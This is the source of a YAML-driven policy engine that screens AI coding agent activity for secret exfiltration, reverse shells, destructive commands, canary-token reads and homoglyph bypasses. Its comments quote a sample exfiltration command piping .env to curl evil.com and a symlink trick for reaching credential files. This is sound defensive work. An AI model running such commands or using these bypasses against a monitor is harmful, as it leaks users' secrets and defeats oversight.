"""YAML-based policy engine for Warden.

Loads detection rules from default_policy.yaml, merges with project-level
overrides from .prismor-warden/policy.yaml, compiles regex patterns, and
evaluates events. Replaces the hardcoded patterns in policies.py.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

try:
    import yaml
except ImportError:
    sys.stderr.write(
        "\n"
        "FATAL: PyYAML is required but not installed.\n"
        "  The policy engine cannot load any rules without it.\n"
        "  All security checks will be non-functional.\n"
        "\n"
        "  Install with:  pip3 install pyyaml\n"
        "           or:   apt-get install python3-yaml\n"
        "\n"
    )
    raise SystemExit(1)


_DEFAULT_POLICY_PATH = Path(__file__).parent / "default_policy.yaml"

# Rules that cannot be disabled or weakened by project-level policy overrides.
# These protect against the most dangerous attack patterns (destructive commands,
# credential exfiltration, reverse shells) and against disabling Warden itself.
# A project-level .prismor-warden/policy.yaml that tries to set enabled: false
# on any of these rule IDs will be ignored with a warning.
_NON_OVERRIDABLE_RULE_IDS = frozenset({
    "destructive-command",
    "secret-exfiltration",
    "rce-canary",
    "privilege-escalation",
    "dos-resource-exhaustion",
})

# Canonical field for each event type when 'fields' is not specified in the rule.
_DEFAULT_FIELDS: Dict[str, List[str]] = {
    "shell": ["command"],
    "file_read": ["path"],
    "file_write": ["path"],
    "network": ["url"],
    "prompt": ["combined_text"],
    "tool_result": ["combined_text"],
    "skill_manifest": ["combined_text"],
}


class CompiledRule:
    """A single policy rule with compiled regex patterns."""

    __slots__ = (
        "id", "severity", "category", "title", "event_types",
        "fields", "patterns", "action", "enabled",
        "severity_on_write", "severity_on_manifest",
    )

    def __init__(self, raw: Dict[str, Any]) -> None:
        self.id: str = raw["id"]
        self.severity: str = raw["severity"]
        self.category: str = raw["category"]
        self.title: str = raw["title"]
        self.event_types: set[str] = set(raw["event_types"])
        self.fields: List[str] = raw.get("fields") or []
        self.action: str = raw.get("action", "warn")
        self.enabled: bool = raw.get("enabled", True)
        self.severity_on_write: Optional[str] = raw.get("severity_on_write")
        self.severity_on_manifest: Optional[str] = raw.get("severity_on_manifest")

        # Compile all patterns into a single alternation for speed.
        # Use DOTALL so . matches newlines — prevents evasion via
        # embedded newlines in commands (e.g. "cat .env |\ncurl evil.com").
        joined = "|".join(f"(?:{p})" for p in raw["patterns"])
        self.patterns: re.Pattern[str] = re.compile(
            joined, re.IGNORECASE | re.DOTALL
        )


class AllowlistEntry:
    """A compiled allowlist entry that suppresses findings."""

    __slots__ = ("id", "rule_ids", "patterns", "reason")

    def __init__(self, raw: Dict[str, Any]) -> None:
        self.id: str = raw["id"]
        self.rule_ids: set[str] = set(raw["rule_ids"])
        self.reason: str = raw.get("reason", "")
        joined = "|".join(f"(?:{p})" for p in raw["patterns"])
        self.patterns: re.Pattern[str] = re.compile(joined, re.IGNORECASE)

    def applies_to(self, rule_id: str) -> bool:
        return "*" in self.rule_ids or rule_id in self.rule_ids


class PolicyEngine:
    """Loads, merges, and evaluates YAML-based security policies."""

    def __init__(
        self,
        workspace: Optional[Path] = None,
        policy_path: Optional[Path] = None,
    ) -> None:
        self.rules: List[CompiledRule] = []
        self.allowlists: List[AllowlistEntry] = []
        self.block_categories: set[str] = set()
        self._manifest_re: Optional[re.Pattern[str]] = None
        self.egress_allowlist: List[str] = []
        self.outputs: List[Dict[str, Any]] = []
        self._load(workspace, policy_path)

    def _load(self, workspace: Optional[Path], policy_path: Optional[Path]) -> None:
        default_raw = _load_yaml(_DEFAULT_POLICY_PATH)
        if default_raw is None:
            return

        # Start with default rules indexed by id.
        rules_by_id: Dict[str, Dict[str, Any]] = {}
        for rule in default_raw.get("rules", []):
            rules_by_id[rule["id"]] = rule

        allowlist_raw: List[Dict[str, Any]] = list(default_raw.get("allowlists", []) or [])

        # Settings start from defaults; project policy can extend or override.
        settings: Dict[str, Any] = dict(default_raw.get("settings", {}) or {})

        # Merge project-level override if present.
        override_path = policy_path
        if override_path is None and workspace is not None:
            candidate = workspace / ".prismor-warden" / "policy.yaml"
            if candidate.exists():
                override_path = candidate

        if override_path is not None and override_path.exists():
            override_raw = _load_yaml(override_path)
            if override_raw is not None:
                for rule in override_raw.get("rules", []):
                    rule_id = rule.get("id", "")
                    if rule_id in _NON_OVERRIDABLE_RULE_IDS:
                        # Check if the override attempts to disable or weaken.
                        if not rule.get("enabled", True):
                            sys.stderr.write(
                                f"[warden] Ignoring project-level override for "
                                f"non-overridable rule '{rule_id}' "
                                f"(cannot be disabled by project policy)\n"
                            )
                            continue
                        # Allow strengthening (e.g. adding patterns) but preserve
                        # the default rule as the base.
                        default = rules_by_id.get(rule_id)
                        if default:
                            merged = {**default, **rule}
                            merged["enabled"] = True  # force enabled
                            rules_by_id[rule_id] = merged
                            continue
                    rules_by_id[rule["id"]] = rule  # override by id
                allowlist_raw.extend(override_raw.get("allowlists", []) or [])
                # Project settings override defaults key-by-key.
                settings.update(override_raw.get("settings", {}) or {})

        # Compile settings.
        self.block_categories = set(settings.get("block_categories", []))
        outputs = settings.get("outputs") or []
        if isinstance(outputs, list):
            self.outputs = [o for o in outputs if isinstance(o, dict)]

        manifest_pats: List[str] = settings.get("manifest_patterns", []) or []
        if manifest_pats:
            joined = "|".join(f"(?:{p})" for p in manifest_pats)
            self._manifest_re = re.compile(joined, re.IGNORECASE)

        self.egress_allowlist = list(settings.get("egress_allowlist", []) or [])

        # Compile rules.
        for rule_data in rules_by_id.values():
            if rule_data.get("enabled", True):
                self.rules.append(CompiledRule(rule_data))

        for al_data in allowlist_raw:
            self.allowlists.append(AllowlistEntry(al_data))

    def _is_manifest(self, path: str) -> bool:
        if not path or self._manifest_re is None:
            return False
        return bool(self._manifest_re.search(path))

    def evaluate(
        self,
        event: Dict[str, Any],
        index: int,
        session_id: str = "",
    ) -> List[Dict[str, Any]]:
        """Evaluate a single event against all loaded rules. Returns findings."""
        event_type = str(event.get("type", "")).lower()
        if not event_type:
            return []

        # Pre-extract fields that rules might match against.
        field_values = _extract_fields(event)
        findings: List[Dict[str, Any]] = []

        for rule in self.rules:
            if event_type not in rule.event_types:
                continue

            # Determine which fields to check.
            check_fields = rule.fields if rule.fields else _DEFAULT_FIELDS.get(event_type, [])
            matched_evidence = None

            for field_name in check_fields:
                value = field_values.get(field_name, "")
                if not value:
                    continue
                if rule.patterns.search(value):
                    matched_evidence = value
                    break

            if matched_evidence is None:
                continue

            # Check allowlist.
            if self._is_allowlisted(rule.id, matched_evidence):
                continue

            # Per-rule severity overrides (configured in YAML, not hardcoded).
            severity = rule.severity
            if rule.severity_on_write and event_type == "file_write":
                severity = rule.severity_on_write
            if rule.severity_on_manifest and self._is_manifest(field_values.get("path", "")):
                severity = rule.severity_on_manifest

            finding_id = f"{rule.id}-{index}"
            prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id

            findings.append({
                "id": prefixed_id,
                "severity": severity,
                "category": rule.category,
                "title": rule.title,
                "evidence": _truncate(matched_evidence),
                "eventIndex": index,
                "ruleId": rule.id,
                "action": rule.action,
            })

        # ── Canarytoken access check ────────────────────────────────────
        # If the agent is reading a registered canarytoken path, raise a
        # CRITICAL finding — canaries are fake credentials planted as honey
        # tokens, so any read is by definition unauthorized reconnaissance.
        if event_type in ("file_read", "file_write"):
            _path = field_values.get("path", "")
            if _path:
                try:
                    from warden.canary import check_path_is_canary, beacon
                    hit = check_path_is_canary(_path.split("\n", 1)[0])
                    if hit:
                        finding_id = f"canary-access-{index}"
                        prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                        findings.append({
                            "id": prefixed_id,
                            "severity": "CRITICAL",
                            "category": "secret_access",
                            "title": f"Canarytoken accessed: {hit['type']} token at {hit['path']}",
                            "evidence": _truncate(_path),
                            "eventIndex": index,
                            "ruleId": "canary-access",
                            "action": "block",
                        })
                        beacon(hit, f"canary-{event_type}", {"session": session_id})
                except Exception:
                    pass

        # Canary marker found in tool stdout/stderr (PostToolUse content
        # scanning) — catches the case where the canary is read indirectly.
        _combined = field_values.get("combined_text", "")
        if _combined:
            try:
                from warden.canary import check_content_for_markers, get_markers
                if get_markers():  # cheap guard to avoid the scan when nothing registered
                    marker = check_content_for_markers(_combined)
                    if marker:
                        finding_id = f"canary-marker-{index}"
                        prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                        findings.append({
                            "id": prefixed_id,
                            "severity": "CRITICAL",
                            "category": "secret_access",
                            "title": "Canarytoken marker detected in tool output",
                            "evidence": f"marker={marker[:24]}…",
                            "eventIndex": index,
                            "ruleId": "canary-marker",
                            "action": "block",
                        })
            except Exception:
                pass

        # ── Homoglyph / Unicode-confusable path check ────────────────────
        # Catches cases like `cat .еnv` where .еnv uses a Cyrillic 'е'
        # (U+0435) instead of Latin 'e' — bypasses every regex rule that
        # matches on literal ASCII strings. Evaluated for shell commands
        # and any file event; triggers whether or not another rule fired.
        for _field in ("command", "path", "url"):
            _val = field_values.get(_field, "")
            if _val and _has_suspicious_unicode(_val):
                finding_id = f"unicode-confusable-{index}"
                prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                findings.append({
                    "id": prefixed_id,
                    "severity": "HIGH",
                    "category": "path_traversal",
                    "title": "Path or command contains Unicode-confusable characters (homoglyph bypass)",
                    "evidence": _truncate(_val),
                    "eventIndex": index,
                    "ruleId": "unicode-confusable",
                    "action": "warn",
                })
                break  # one finding per event is enough

        # ── Egress allowlist check ──────────────────────────────────────
        if self.egress_allowlist and event_type == "network":
            url = field_values.get("url", "")
            if url:
                domain = _extract_domain(url)
                if domain and not self._is_domain_allowed(domain):
                    finding_id = f"egress-not-allowed-{index}"
                    prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                    findings.append({
                        "id": prefixed_id,
                        "severity": "HIGH",
                        "category": "network_isolation",
                        "title": f"Outbound request to domain not in egress allowlist: {domain}",
                        "evidence": _truncate(url),
                        "eventIndex": index,
                        "ruleId": "egress-allowlist",
                        "action": "warn",
                    })

        # Also check shell commands for URLs to non-allowed domains.
        if self.egress_allowlist and event_type == "shell":
            command_text = field_values.get("command", "")
            for domain in _extract_domains_from_command(command_text):
                if not self._is_domain_allowed(domain):
                    finding_id = f"egress-not-allowed-{index}-{domain}"
                    prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                    findings.append({
                        "id": prefixed_id,
                        "severity": "HIGH",
                        "category": "network_isolation",
                        "title": f"Shell command contacts domain not in egress allowlist: {domain}",
                        "evidence": _truncate(command_text),
                        "eventIndex": index,
                        "ruleId": "egress-allowlist",
                        "action": "warn",
                    })
                    break  # One finding per command is enough.

        return findings

    def check_command(self, command: str) -> List[Dict[str, Any]]:
        """Quick check: evaluate a shell command string. Returns findings."""
        event = {"type": "shell", "command": command}
        return self.evaluate(event, 0)

    def check_path(self, path: str, event_type: str = "file_read") -> List[Dict[str, Any]]:
        """Quick check: evaluate a file path. Returns findings."""
        event = {"type": event_type, "path": path}
        return self.evaluate(event, 0)

    def _is_allowlisted(self, rule_id: str, evidence: str) -> bool:
        for entry in self.allowlists:
            if entry.applies_to(rule_id) and entry.patterns.search(evidence):
                return True
        return False

    def _is_domain_allowed(self, domain: str) -> bool:
        """Check if a domain matches any entry in the egress allowlist.

        Supports exact match and wildcard subdomains (e.g. "*.github.com"
        matches "api.github.com" and "raw.github.com").
        """
        domain_lower = domain.lower()
        for pattern in self.egress_allowlist:
            pattern_lower = pattern.lower()
            if pattern_lower.startswith("*."):
                # Wildcard: *.example.com matches example.com and sub.example.com
                suffix = pattern_lower[2:]
                if domain_lower == suffix or domain_lower.endswith("." + suffix):
                    return True
            else:
                if domain_lower == pattern_lower:
                    return True
        return False


# ── Shared helpers ──────────────────────────────────────────────────────────

# Unicode scripts we treat as "latin-like" — mixing ASCII filenames with chars
# from other scripts (Cyrillic, Greek, Armenian, etc.) is a classic homoglyph
# attack vector. The check is conservative: it only fires on paths/commands
# that contain both ASCII letters AND non-ASCII-letter characters that look
# confusingly like ASCII letters.
_CONFUSABLE_CODEPOINTS = frozenset({
    # Cyrillic lookalikes: а в е к м н о р с т у х І ѕ і ј А В Е К М Н О Р С Т Х Ѵ
    0x0430, 0x0432, 0x0435, 0x043A, 0x043C, 0x043D, 0x043E,
    0x0440, 0x0441, 0x0442, 0x0443, 0x0445,
    0x0406, 0x0455, 0x0456, 0x0458,
    0x0410, 0x0412, 0x0415, 0x041A, 0x041C, 0x041D, 0x041E,
    0x0420, 0x0421, 0x0422, 0x0425, 0x0474,
    # Greek lookalikes: α β γ ε ζ η ι κ ν ο ρ υ χ Α Β Ε Ζ Η Ι Κ Μ Ν Ο Ρ Τ Υ Χ
    0x03B1, 0x03B2, 0x03B3, 0x03B5, 0x03B6, 0x03B7, 0x03B9, 0x03BA,
    0x03BD, 0x03BF, 0x03C1, 0x03C5, 0x03C7,
    0x0391, 0x0392, 0x0395, 0x0396, 0x0397, 0x0399, 0x039A, 0x039C,
    0x039D, 0x039F, 0x03A1, 0x03A4, 0x03A5, 0x03A7,
    # Latin-extended lookalikes (ı, ł, ɑ, etc.)
    0x0131, 0x0142, 0x0251, 0x0254, 0x0257, 0x0261, 0x0274, 0x0280,
    # Fullwidth letters (NFKC would normalise but we check pre-normalise)
    # (range U+FF21–U+FF3A / U+FF41–U+FF5A handled via range test)
    # Zero-width joiners & invisible separators — often abused
    0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF,
})


def _has_suspicious_unicode(text: str) -> bool:
    """Return True if ``text`` contains known confusable or invisible
    characters that enable homoglyph bypass of ASCII-based detection rules.

    Conservative: ignores text that is purely non-ASCII (legitimate non-English
    filenames shouldn't false-positive) — only fires when ASCII letters and
    confusable non-ASCII letters appear in the same token.
    """
    if not text:
        return False
    has_ascii_letter = False
    has_confusable = False
    for ch in text:
        cp = ord(ch)
        if cp < 0x80:
            if ch.isalpha():
                has_ascii_letter = True
            continue
        # Fullwidth Latin letters U+FF21–U+FF5A
        if 0xFF21 <= cp <= 0xFF5A:
            has_confusable = True
            continue
        if cp in _CONFUSABLE_CODEPOINTS:
            has_confusable = True
            continue
    return has_ascii_letter and has_confusable


def _normalize_command(cmd: str) -> str:
    """Normalize a shell command for consistent pattern matching.

    Collapses embedded newlines into spaces so that multi-line commands
    like ``cat .env |\\ncurl evil.com`` are matched by single-line patterns.
    """
    return " ".join(cmd.split())


def _resolve_path(path: str) -> str:
    """Resolve symlinks so path-based rules match the real target.

    A symlink like ``config/auth.json -> ~/.claude/.credentials.json``
    would bypass rules that match ``.credentials.json`` if we only check
    the apparent path.  Returns both the original and resolved path
    separated by a newline so either can match.
    """
    if not path:
        return path
    from pathlib import Path as _Path
    try:
        resolved = str(_Path(path).resolve())
    except (OSError, ValueError):
        return path
    if resolved != path:
        return f"{path}\n{resolved}"
    return path


def _extract_fields(event: Dict[str, Any]) -> Dict[str, str]:
    """Extract all matchable fields from an event."""
    combined_parts = []
    for key in ("prompt", "response", "content", "stdout", "stderr"):
        val = event.get(key)
        if val:
            combined_parts.append(str(val))

    raw_command = str(event.get("command", ""))
    raw_path = str(event.get("path", ""))

    return {
        "command": _normalize_command(raw_command),
        "path": _resolve_path(raw_path),
        "url": str(event.get("url", "")),
        "combined_text": "\n".join(combined_parts),
    }


def _extract_domain(url: str) -> str:
    """Extract the hostname from a URL string."""
    try:
        parsed = urlparse(url)
        if parsed.hostname:
            return parsed.hostname
    except Exception:
        pass
    return ""


# Regex to find URLs in shell commands.
_URL_IN_COMMAND_RE = re.compile(r'https?://([a-zA-Z0-9][-a-zA-Z0-9.]*[a-zA-Z0-9])')


def _extract_domains_from_command(command: str) -> List[str]:
    """Extract domain names from URLs found in a shell command string."""
    domains: List[str] = []
    for match in _URL_IN_COMMAND_RE.finditer(command):
        host = match.group(1).split("/")[0].split(":")[0]
        if "." in host and not re.match(r'^\d{1,3}(\.\d{1,3}){3}$', host):
            domains.append(host)
    return domains


def _truncate(value: str, max_length: int = 220) -> str:
    text = str(value).strip()
    return text if len(text) <= max_length else f"{text[:max_length - 3]}..."


def _load_yaml(path: Path) -> Optional[Dict[str, Any]]:
    """Load a YAML file. Falls back to basic parsing if PyYAML is missing."""
    if not path.exists():
        return None
    text = path.read_text(encoding="utf-8")
    if yaml is not None:
        return yaml.safe_load(text)
    # Minimal fallback: try JSON (YAML is a superset of JSON).
    import json
    try:
        return json.loads(text)
    except Exception:
        print(f"Warning: PyYAML not installed, cannot load {path}", file=sys.stderr)
        return None


def validate_policy(path: Path) -> List[str]:
    """Validate a policy YAML file. Returns a list of error messages (empty = valid)."""
    errors: List[str] = []
    raw = _load_yaml(path)
    if raw is None:
        return [f"Cannot read {path}"]

    if "version" not in raw:
        errors.append("Missing required field: version")
    elif raw["version"] != "1.0":
        errors.append(f"Unsupported version: {raw['version']} (expected 1.0)")

    if "rules" not in raw:
        errors.append("Missing required field: rules")
        return errors

    seen_ids: set[str] = set()
    for i, rule in enumerate(raw.get("rules", [])):
        prefix = f"rules[{i}]"
        for field in ("id", "severity", "category", "title", "event_types", "patterns", "action"):
            if field not in rule:
                errors.append(f"{prefix}: missing required field '{field}'")

        rule_id = rule.get("id", "")
        if rule_id in seen_ids:
            errors.append(f"{prefix}: duplicate rule id '{rule_id}'")
        seen_ids.add(rule_id)

        for j, pattern in enumerate(rule.get("patterns", [])):
            try:
                re.compile(pattern)
            except re.error as e:
                errors.append(f"{prefix}.patterns[{j}]: invalid regex: {e}")

        action = rule.get("action", "")
        if action and action not in ("block", "warn", "log"):
            errors.append(f"{prefix}: invalid action '{action}' (must be block, warn, or log)")

    for i, entry in enumerate(raw.get("allowlists", []) or []):
        prefix = f"allowlists[{i}]"
        for field in ("id", "rule_ids", "patterns"):
            if field not in entry:
                errors.append(f"{prefix}: missing required field '{field}'")
        for j, pattern in enumerate(entry.get("patterns", [])):
            try:
                re.compile(pattern)
            except re.error as e:
                errors.append(f"{prefix}.patterns[{j}]: invalid regex: {e}")

    return errors
